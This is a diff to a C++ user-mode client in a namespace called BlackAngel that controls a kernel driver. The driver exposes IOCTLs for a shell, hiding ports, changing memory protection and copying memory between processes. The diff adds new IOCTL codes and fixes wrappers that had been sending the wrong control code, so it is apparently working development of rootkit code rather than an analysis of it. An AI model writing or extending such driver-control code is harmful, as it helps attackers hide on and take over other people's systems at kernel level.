@@ -9,6 +9,9 @@
 #define IOCTL_SHELL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666e, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
 #define IOCTL_GETBUFF  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x78616666f, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
 
+#define IOCTL_ZWPVM    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665a, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+#define IOCTL_MCVM     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x786166665b, METHOD_NEITHER, FILE_SPECIAL_ACCESS)
+
 // Set to FALSE to disable console output
 #define OUTPUT TRUE
 
@@ -200,7 +203,7 @@ namespace BlackAngel
 		zwpvm.OldAccessProtection = oldAccessProtection;
 
 		DWORD returned;
-		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ZWPVM, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
 		if (!success)
 		{
 #if OUTPUT
@@ -218,7 +221,7 @@ namespace BlackAngel
 	BOOL ZwProtectVirtualMemory(zwpvm_t zwpvm)
 	{
 		DWORD returned;
-		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ZWPVM, &zwpvm, sizeof(zwpvm), nullptr, 0, &returned, nullptr);
 		if (!success)
 		{
 #if OUTPUT
@@ -243,7 +246,7 @@ namespace BlackAngel
 		mcvm.BufferSize = bufferSize;
 
 		DWORD returned;
-		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_MCVM, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
 		if (!success)
 		{
 #if OUTPUT
@@ -261,7 +264,7 @@ namespace BlackAngel
 	BOOL MmCopyVirtualMemory(mcvm_t mcvm)
 	{
 		DWORD returned;
-		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_MCVM, &mcvm, sizeof(mcvm), nullptr, 0, &returned, nullptr);
 		if (!success)
 		{
 #if OUTPUT
